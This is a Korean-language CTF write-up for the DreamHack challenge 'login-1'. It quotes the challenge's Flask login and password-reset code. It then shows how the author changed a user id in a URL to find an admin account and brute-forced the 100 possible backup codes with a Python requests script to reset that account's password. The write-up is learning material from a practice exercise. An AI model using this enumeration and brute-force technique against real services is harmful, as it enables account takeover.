---
layout: post
title: "(DreamHack) login-1"
date: 2021-06-01 05:24:00 -0400
categories: Security CTF
---

## 풀이
플래그를 얻기 위해서는 유저 레벨이 'admin'인 계정으로 로그인해야 한다.

```python
userLevel = {
    0 : 'guest',
    1 : 'admin'
}
MAXRESETCOUNT = 5

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

@app.route('/admin')
def admin():
    if session and (session['level'] == userLevel[1]):
        return FLAG

    return "Only Admin !"
```


userid를 클릭하면 아래와 같은 화면이 나온다. 이때 url에 있는 17이란 숫자가 user에 부여되는 특정 id라고 가정하여 해당 숫자를 변경해 보았다.
![image](https://user-images.githubusercontent.com/24788751/120293279-0cf91980-c300-11eb-9c7f-aa502b0a3816.png)

이때 potato라는 사용자의 유저 레벨이 1인 것을 확인하였다.

![admin1](https://user-images.githubusercontent.com/24788751/120293014-cf948c00-c2ff-11eb-9c89-ab0a6e23ffae.PNG)

비밀번호 찾기를 통해 비밀번호를 수정하도록 한다.

```python
def makeBackupcode():
    return random.randrange(100)

@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'GET':
        return render_template('forgot.html')
    else:
        userid = request.form.get("userid")
        newpassword = request.form.get("newpassword")
        backupCode = request.form.get("backupCode", type=int)

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ?', (userid,)).fetchone()
        if user:
            # security for brute force Attack.
            time.sleep(1)

            if user['resetCount'] == MAXRESETCOUNT:
                return "<script>alert('reset Count Exceed.');history.back(-1);</script>"
            
            if user['backupCode'] == backupCode:
                newbackupCode = makeBackupcode()
                updateSQL = "UPDATE user set pw = ?, backupCode = ?, resetCount = 0 where idx = ?"
                cur.execute(updateSQL, (hashlib.sha256(newpassword.encode()).hexdigest(), newbackupCode, str(user['idx'])))
                msg = f"<b>Password Change Success.</b><br/>New BackupCode : {newbackupCode}"

            else:
                updateSQL = "UPDATE user set resetCount = resetCount+1 where idx = ?"
                cur.execute(updateSQL, (str(user['idx'])))
                msg = f"Wrong BackupCode !<br/><b>Left Count : </b> {(MAXRESETCOUNT-1)-user['resetCount']}"
            
            conn.commit()
            return render_template("index.html", msg=msg)

        return "<script>alert('User Not Found.');history.back(-1);</script>";
```

백업 코드는 0이상 100미만의 수가 생성되기 때문에 브루트포스 방식을 통해 백업코드를 찾고 원하는 비밀번호로 변경할 수 있도록 하였다.

```python
import json
import requests

u = "http://host1.dreamhack.games:17892/forgot_password"
userid = "potato"

for i in range(0, 100):
    data = {'userid': "potato", 'backupCode': i, 'newpassword':"aaa"}
    res = requests.post(u, data=data)
    if res.status_code == 200:
        print(i, " was backup code")
        print(res.text)
    else: # 500
        print("-")
```